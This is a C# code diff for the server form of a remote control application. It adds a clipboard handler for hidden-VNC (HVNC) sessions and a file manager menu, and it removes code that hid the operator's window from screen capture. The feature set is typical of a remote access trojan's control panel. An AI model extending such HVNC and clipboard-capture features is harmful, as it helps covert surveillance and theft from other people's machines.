@@ -10,7 +10,6 @@ using RemoteControl.Protocals;
 using System.IO;
 using System.Threading;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
 using log4net;
 using RemoteControl.Protocals.Plugin;
 using RemoteControl.Protocals.Request;
@@ -48,17 +47,13 @@ namespace RemoteControl.Server
         private Dictionary<string, Action<ResponseStartCaptureVideo>> sessionVideoHandlers = new Dictionary<string, Action<ResponseStartCaptureVideo>>();
         private Dictionary<string, Action<ResponseHVNCScreen>> sessionHVNCScreenHandlers = new Dictionary<string, Action<ResponseHVNCScreen>>();
         private Dictionary<string, Action<ResponseHVNCStart>> sessionHVNCStartHandlers = new Dictionary<string, Action<ResponseHVNCStart>>();
+        private Dictionary<string, Action<ResponseClipboardGet>> sessionHVNCClipboardHandlers = new Dictionary<string, Action<ResponseClipboardGet>>();
         private SendCommandHotKey sendCommandHotKey = SendCommandHotKey.Enter;
         private WaveOut _waveOut = null;
         private Panel topNavigationPanel;
         private Label topRelayStatusLabel;
         private Label topClientInfoLabel;
         private Button topRelayButton;
-        private const uint WDA_MONITOR = 0x00000001;
-        private const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
-
-        [DllImport("user32.dll")]
-        private static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
 
         public FrmMain()
         {
@@ -72,12 +67,13 @@ namespace RemoteControl.Server
             this.StartPosition = FormStartPosition.CenterScreen;
             this.ShowInTaskbar = true;
             Control.CheckForIllegalCrossThreadCalls = false;
-            ApplyCaptureExclusion();
             initClientContextMenu();
+            initFileManagerContextMenu();
             initSkinMenus();
             initIcons();
             initServerEvents();
             BuildTopNavigationUI();
+            InitializeHostDashboardLayout();
             AutoConnectRelay();
             UIUtil.BindTextBoxCtrlA(this.textBoxCommandRequest);
             UIUtil.BindTextBoxCtrlA(this.textBoxCommandResponse);
@@ -85,21 +81,6 @@ namespace RemoteControl.Server
             if (WaveOut.Devices.Length > 0)
             {
                 _waveOut = new WaveOut(WaveOut.Devices[0], 8000, 16, 1);
-            }
-        }
-
-        private void ApplyCaptureExclusion()
-        {
-            try
-            {
-                if (!SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE))
-                {
-                    SetWindowDisplayAffinity(this.Handle, WDA_MONITOR);
-                }
-            }
-            catch (Exception ex)
-            {
-                Logger.Warn("ApplyCaptureExclusion failed", ex);
             }
         }
 
